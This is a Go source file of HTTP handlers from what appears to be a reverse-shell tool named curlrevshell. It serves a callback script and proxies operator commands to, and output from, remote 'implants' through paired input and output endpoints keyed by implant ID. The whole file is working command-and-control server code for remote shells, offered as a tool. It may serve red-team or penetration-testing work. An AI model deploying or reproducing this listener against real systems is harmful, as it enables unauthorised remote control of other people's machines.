package hsrv

/*
 * handlers.go
 * HTTP handlers
 * By J. Stuart McMurray
 * Created 20240324
 * Last Modified 20240426
 */

import (
	"context"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"os"
	"strings"

	"github.com/magisterquis/curlrevshell/lib/opshell"
)

const (
	// idParam is the named value in the path for the implant ID.
	idParam = "id"
)

const (
	// ShellReadyMessage is what we print when both sides of the shell are
	// connected.
	ShellReadyMessage = "Shell is ready to go!"

	// ShellDisconnectedMessage is what we print when both sides of the
	// shell are gone.
	ShellDisconnectedMessage = "Shell is gone :("
)

// Log messages and keys.
const (
	LMDisconnected  = "Disconnected"
	LMFileRequested = "File requested"
	LMNewConnection = "New connection"
	LMShellInput    = "Sent shell input"
	LMShellOutput   = "Shell output"

	LKDirection      = "direction"
	LKFilename       = "filename"
	LKLine           = "line"
	LKOutput         = "output"
	LKStaticFilesDir = "static_files_dir"
)

// ErrConnectionClosed indicates we're closing the input connection because one
// side or the other closed.
var ErrConnectionClosed = errors.New("connection closed")

// newMux returns a new ServeMux, ready to serve.
func (s *Server) newMux() *http.ServeMux {
	mux := http.NewServeMux()

	/* Shellish handlers. */
	mux.HandleFunc("/i/{"+idParam+"}", s.inputHandler)  /* Shell input. */
	mux.HandleFunc("/o/{"+idParam+"}", s.outputHandler) /* Shell output. */
	mux.HandleFunc("/c", s.scriptHandler)               /* Callback script. */

	/* If we're serving static files, do that. */
	if "" != s.fdir {
		mux.HandleFunc("/", s.fileHandler)
	}

	return mux
}

// fileHandler logs and serves files.
func (s *Server) fileHandler(w http.ResponseWriter, r *http.Request) {
	sl := s.requestLogger(r).With(LKStaticFilesDir, s.fdir)

	/* Work out what to send back. */
	s.RLogf(FileColor, r, "File requested: %s", r.URL)
	f, err := os.Open(s.fdir)
	if nil != err {
		s.RErrorLogf(r, "Could not open %s: %s", s.fdir, err)
		http.Error(w, "", http.StatusInternalServerError)
		return
	}
	defer f.Close()
	fi, err := f.Stat()
	if nil != err {
		s.RErrorLogf(r, "Could not get info about %s: %s", s.fdir, err)
		http.Error(w, "", http.StatusInternalServerError)
		return
	}

	sl.Info(LMFileRequested)

	/* If we've just been given one file, send it for all requests. */
	if fi.Mode().IsRegular() {
		http.ServeContent(w, r, s.fdir, fi.ModTime(), f)
		return
	}

	/* For everything else, let the http library do the work. */
	http.FileServer(http.Dir(s.fdir)).ServeHTTP(w, r)
}

// inputHandler accepts a connection from a shell and sends it input.
func (s *Server) inputHandler(w http.ResponseWriter, r *http.Request) {
	ctx, cancel := context.WithCancelCause(r.Context())
	defer cancel(errors.New("handler returned"))

	/* Make sure we're ok with this connection and set up logging. */
	which := "Input"
	sl := s.startConnection(w, r, &s.curIDIn, &s.curIDOut, which, cancel)
	if nil == sl {
		return
	}
	var cerr error
	defer func() {
		s.endConnection(sl, r, &s.curIDIn, &s.curIDOut, which, cerr)
	}()

	/* Proxy lines from stdin. */
	rc := http.NewResponseController(w)
	for nil == cerr {
		select {
		case l, ok := <-s.ich:
			if !ok { /* Input channel closed. */
				return
			}
			if _, err := fmt.Fprintf(w, "%s\n", l); nil != err {
				s.RErrorLogf(r, "Error sending line: %s", err)
				return
			}
			if err := rc.Flush(); nil != err {
				s.RErrorLogf(r, "Error flushing line: %s", err)
				return
			}
			sl.Info(LMShellInput, LKLine, l)
		case <-ctx.Done():
			cerr = context.Cause(ctx)
		}
	}
}

// outputHandler receives a line of output from the shell and prints it, if the
// id matches the currently-connected shell.
func (s *Server) outputHandler(w http.ResponseWriter, r *http.Request) {
	/* Make sure we're ok with this connection and set up logging. */
	which := "Output"
	sl := s.startConnection(w, r, &s.curIDOut, &s.curIDIn, which, nil)
	if nil == sl {
		return
	}
	var err error
	defer func() {
		s.endConnection(sl, r, &s.curIDOut, &s.curIDIn, which, err)
	}()

	/* Read output and send it to the shell. */
	b := make([]byte, 2048)
	var n int
	for nil == err {
		n, err = r.Body.Read(b)
		if 0 != n {
			o := string(b[:n])
			s.och <- opshell.CLine{Line: o, Plain: true}
			sl.Info(LMShellOutput, LKOutput, o)
		}
		/* End of stream isn't really an error. */
		if errors.Is(err, io.EOF) ||
			errors.Is(err, io.ErrUnexpectedEOF) {
			err = nil
			break
		}
	}
}

// getID gets the ID for the implant from the request.  If there is no ID, it
// logs and error and returns the empty string.
func (s *Server) getID(r *http.Request) string {
	id := r.PathValue(idParam)
	return id
}

// startConnection gets the ID from r and stores it in the location pointed to
// by us if us points to an empty string and other points either to an empty
// string or a string equal to the ID in r.  r and which will be used for
// logging.  A suitable logger for r will be returned, or nil if the handler
// shouldn't process the request.  which should be capitalized.
func (s *Server) startConnection(
	w http.ResponseWriter,
	r *http.Request,
	us *string,
	other *string,
	which string,
	stopIn func(error), /* May be nil. */
) *slog.Logger {
	s.curIDL.Lock()
	defer s.curIDL.Unlock()

	/* This all fails if the ID is empty. */
	id := s.getID(r)
	if "" == id {
		return nil
	}

	/* We'll need this a few times. */
	lwhich := strings.ToLower(which)

	/* Make sure the other is either empty or the new one. */
	if "" != *other && id != *other {
		s.RErrorLogf(
			r,
			"Rejected %s connection with ID %s, expected %s",
			lwhich,
			id,
			*other,
		)
		return nil
	}

	/* Make sure where we want to be is empty. */
	if id == *us {
		s.RErrorLogf(
			r,
			"Rejected duplicate %s connection with ID %s",
			lwhich,
			id,
		)
		return nil
	} else if "" != *us {
		s.RErrorLogf(
			r,
			"Rejected unexpected %s connection with ID %s",
			lwhich,
			id,
		)
		return nil
	}

	/* All set, note we're the new us ID. */
	sl := s.requestLogger(r)
	s.RLogf(ConnectedColor, r, "%s connected: ID:%s", which, id)
	sl.Info(LMNewConnection, LKDirection, lwhich)
	*us = id

	/* Register the input-stopper, if we have one. */
	if nil != stopIn {
		s.stopIn = stopIn
	}

	/* If we have both sides, we have a shell. */
	if *other == id {
		s.RLogf(ConnectedColor, r, "%s", ShellReadyMessage)
	}

	return sl
}

// endConnection stores the empty string in us and logs the connection's end.
// which should be capitalized.
func (s *Server) endConnection(
	sl *slog.Logger,
	r *http.Request,
	us *string,
	other *string,
	which string,
	err error,
) {
	s.curIDL.Lock()
	defer s.curIDL.Unlock()

	/* A connection closing isn't a real error. */
	if errors.Is(err, ErrConnectionClosed) {
		err = nil
	}

	/* Note we've lost this half of the connection. */
	*us = ""
	sl = sl.With(LKDirection, strings.ToLower(which))
	switch err {
	case nil:
		s.RErrorLogf(r, "%s connection closed", which)
		sl.Info(LMDisconnected)
	default:
		s.RErrorLogf(r, "%s connection closed: %s", which, err)
		sl.Error(LMDisconnected, LKError, err)
	}

	/* Note the shell's dead, if it's dead. */
	if "" == *other {
		s.RErrorLogf(r, "%s", ShellDisconnectedMessage)
		s.printCallbackHelp()
	}

	/* Stop the input side as well. */
	if nil != s.stopIn {
		s.stopIn(ErrConnectionClosed)
		s.stopIn = nil
	}
}

// requestLogger returns a log.Logger which has information about r.
func (s *Server) requestLogger(r *http.Request) *slog.Logger {
	/* Work out the SNI, which may or may not exyist. */
	var sni string
	if nil != r.TLS {
		sni = r.TLS.ServerName
	}
	/* Logger with ALL the info. */
	return s.sl.With(slog.Group(
		"http_request",
		"remote_addr", r.RemoteAddr,
		"method", r.Method,
		"request_uri", r.RequestURI,
		"protocol", r.Proto,
		"host", r.Host,
		"sni", sni,
		"user_agent", r.UserAgent(),
		"id", s.getID(r),
	))
}
